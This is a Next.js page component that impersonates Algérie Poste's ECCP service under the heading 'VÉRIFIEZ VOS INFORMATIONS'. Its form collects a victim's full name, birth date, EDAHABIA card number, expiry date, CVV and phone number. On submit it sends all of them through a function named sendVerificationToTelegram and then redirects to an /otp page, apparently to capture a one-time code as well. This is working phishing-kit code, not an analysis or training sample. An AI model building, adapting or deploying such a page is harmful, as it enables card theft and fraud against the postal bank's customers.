"use client"

import type React from "react"
import { Menu } from "lucide-react"
import Image from "next/image"
import { useState } from "react"
import { sendVerificationToTelegram } from "../actions"

export default function VerifyPage() {
  const [formData, setFormData] = useState({
    fullName: "",
    day: "",
    month: "",
    year: "",
    edahabiaCard: "",
    expirationMonth: "01",
    expirationYear: "2025",
    cvv: "",
    phoneNumber: "",
  })

  const [loading, setLoading] = useState(false)
  const [message, setMessage] = useState("")

  const months = [
    { value: "01", label: "01 - janvier" },
    { value: "02", label: "02 - février" },
    { value: "03", label: "03 - mars" },
    { value: "04", label: "04 - avril" },
    { value: "05", label: "05 - mai" },
    { value: "06", label: "06 - juin" },
    { value: "07", label: "07 - juillet" },
    { value: "08", label: "08 - août" },
    { value: "09", label: "09 - septembre" },
    { value: "10", label: "10 - octobre" },
    { value: "11", label: "11 - novembre" },
    { value: "12", label: "12 - décembre" },
  ]

  const years = Array.from({ length: 6 }, (_, i) => 2025 + i)

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }))
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setMessage("")

    try {
      const result = await sendVerificationToTelegram(formData)
      if (result.success) {
        window.location.href = "/otp"
      } else {
        setMessage("Erreur lors de la vérification")
      }
    } catch (error) {
      setMessage("Une erreur s'est produite")
    } finally {
      setLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gray-100 font-sans">
      {/* Header */}
      <header className="bg-blue-900 text-white px-6 py-4 flex items-center justify-between">
        <div className="w-16 h-16 flex items-center justify-center">
          <Image src="/logo.png" alt="ECCP Algérie Poste" width={64} height={64} priority />
        </div>
        <button className="text-yellow-400 hover:text-yellow-300">
          <Menu size={32} />
        </button>
      </header>

      {/* Main Content */}
      <main className="max-w-2xl mx-auto px-6 py-12">
        {/* Title Section */}
        <div className="mb-12">
          <h1 className="text-3xl font-bold text-blue-900 mb-2 font-sans">ECCP - ALGÉRIE POSTE</h1>
          <div className="h-1 bg-yellow-400 w-full mb-8"></div>
          <h2 className="text-xl font-semibold text-gray-800 font-sans">VÉRIFIEZ VOS INFORMATIONS</h2>
        </div>

        {/* Verification Form Container */}
        <div className="bg-gray-200 border-4 border-blue-900 rounded-3xl p-8 mb-12">
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Full Name */}
            <div>
              <label className="block text-gray-800 font-semibold mb-3 font-sans">Nom complet</label>
              <input
                type="text"
                name="fullName"
                value={formData.fullName}
                onChange={handleInputChange}
                required
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-900 bg-white font-sans"
                placeholder=""
              />
            </div>

            {/* Birthday */}
            <div>
              <label className="block text-gray-800 font-semibold mb-3 font-sans">Date de naissance</label>
              <div className="flex gap-3">
                <input
                  type="text"
                  name="day"
                  value={formData.day}
                  onChange={(e) => {
                    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 2)
                    setFormData((prev) => ({ ...prev, day: value }))
                  }}
                  placeholder="JJ"
                  maxLength={2}
                  required
                  className="w-20 px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-900 bg-white font-sans text-center"
                />
                <input
                  type="text"
                  name="month"
                  value={formData.month}
                  onChange={(e) => {
                    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 2)
                    setFormData((prev) => ({ ...prev, month: value }))
                  }}
                  placeholder="MM"
                  maxLength={2}
                  required
                  className="w-20 px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-900 bg-white font-sans text-center"
                />
                <input
                  type="text"
                  name="year"
                  value={formData.year}
                  onChange={(e) => {
                    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 4)
                    setFormData((prev) => ({ ...prev, year: value }))
                  }}
                  placeholder="AAAA"
                  maxLength={4}
                  required
                  className="w-24 px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-900 bg-white font-sans text-center"
                />
              </div>
            </div>

            {/* EDAHABIA Card */}
            <div>
              <label className="block text-gray-800 font-semibold mb-3 font-sans">Numéro de la carte EDAHABIA</label>
              <input
                type="text"
                name="edahabiaCard"
                value={formData.edahabiaCard}
                onChange={(e) => {
                  const numericValue = e.target.value.replace(/[^0-9]/g, "").slice(0, 16)
                  setFormData((prev) => ({ ...prev, edahabiaCard: numericValue }))
                }}
                required
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-900 bg-white font-sans"
                placeholder=""
              />
            </div>

            {/* Card Expiration */}
            <div>
              <label className="block text-gray-800 font-semibold mb-3 font-sans">Date d'expiration</label>
              <div className="flex gap-3">
                <select
                  name="expirationMonth"
                  value={formData.expirationMonth}
                  onChange={handleInputChange}
                  className="flex-1 px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-900 bg-white font-sans"
                >
                  {months.map((month) => (
                    <option key={month.value} value={month.value}>
                      {month.label}
                    </option>
                  ))}
                </select>
                <select
                  name="expirationYear"
                  value={formData.expirationYear}
                  onChange={handleInputChange}
                  className="w-32 px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-900 bg-white font-sans"
                >
                  {years.map((year) => (
                    <option key={year} value={year}>
                      {year}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            {/* CVV */}
            <div>
              <label className="block text-gray-800 font-semibold mb-3 font-sans">CVV</label>
              <input
                type="text"
                name="cvv"
                value={formData.cvv}
                onChange={(e) => {
                  const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 3)
                  setFormData((prev) => ({ ...prev, cvv: value }))
                }}
                maxLength={3}
                required
                className="w-32 px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-900 bg-white font-sans"
                placeholder=""
              />
            </div>

            {/* Phone Number */}
            <div>
              <label className="block text-gray-800 font-semibold mb-3 font-sans">Numéro de téléphone</label>
              <input
                type="tel"
                name="phoneNumber"
                value={formData.phoneNumber}
                onChange={handleInputChange}
                required
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-900 bg-white font-sans"
                placeholder=""
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-900 text-white font-bold py-3 px-6 rounded-lg hover:bg-blue-800 transition-colors mt-8 font-sans disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {loading ? "Validation..." : "Valider"}
            </button>

            {message && (
              <div
                className={`text-center font-sans ${message.includes("Erreur") ? "text-red-600" : "text-green-600"}`}
              >
                {message}
              </div>
            )}
          </form>
        </div>
      </main>
    </div>
  )
}
